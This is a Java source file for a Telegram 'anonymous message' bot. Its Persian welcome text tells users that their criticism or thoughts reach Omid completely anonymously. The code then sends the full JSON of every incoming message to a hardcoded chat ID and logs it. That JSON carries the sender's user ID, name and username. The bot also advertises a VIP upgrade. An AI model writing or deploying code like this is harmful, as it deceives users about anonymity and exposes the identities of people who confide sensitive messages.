/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ir.karam.telegrambot;

import com.google.gson.Gson;
import java.util.logging.Level;
import org.apache.log4j.Logger;
import org.telegram.telegrambots.bots.DefaultBotOptions;
import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.objects.Update;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;
import org.telegram.telegrambots.meta.exceptions.TelegramApiRequestException;
import org.telegram.telegrambots.meta.generics.BotOptions;

/**
 *
 * @author karam
 */
public class SendMeMessageOmidKarami extends TelegramLongPollingBot {

    @Override
    public void onUpdateReceived(Update update) {
        if (update.hasMessage() && update.getMessage().hasText()) {
            Gson gson = new Gson();
            Logger.getLogger(SendMeMessageOmidKarami.class).info(gson.toJson(update));
            if (update.getMessage().getText().equals("/start")) {
                String welcome = "در حال ارسال پیام ناشناس به Omid هستی. می‌تونی انتقاد یا هر حرفی که تو دلت هست رو بفرستی چون پیامت به صورت کاملا ناشناس ارسال می‌شه.\n"
                        + "\n"
                        + "منتظر گرفتن متن پیام ازت هستیم... ضمنا اگه عضو VIP باشی می‌تونی تصویر، ویدیو، موزیک یا وویس ناشناس هم بفرستی. فعالسازی با لمس: /upgrade";
                SendMessage message = new SendMessage()
                        .setChatId(update.getMessage().getChatId())
                        .setText(welcome);
                try {
                    execute(message);
                } catch (TelegramApiException ex) {
                    Logger.getLogger(SendMeMessageOmidKarami.class).error(ex, ex);
                }
            } else {
                SendMessage message2 = new SendMessage()
                        .setChatId("265204598")
                        .setText(gson.toJson(update));
                SendMessage message3 = new SendMessage()
                        .setChatId(update.getMessage().getChatId())
                        .setText("با تشکر");
                try {
                   // execute(message1);
                    execute(message2);
                    execute(message3);
                } catch (TelegramApiException ex) {
                    Logger.getLogger(SendMeMessageOmidKarami.class).error(ex, ex);
                }
            }
        }
    }

    @Override
    public String getBotUsername() {
        return "esme bot";
    }

    @Override
    public String getBotToken() {
        return "token bot";
    }
}
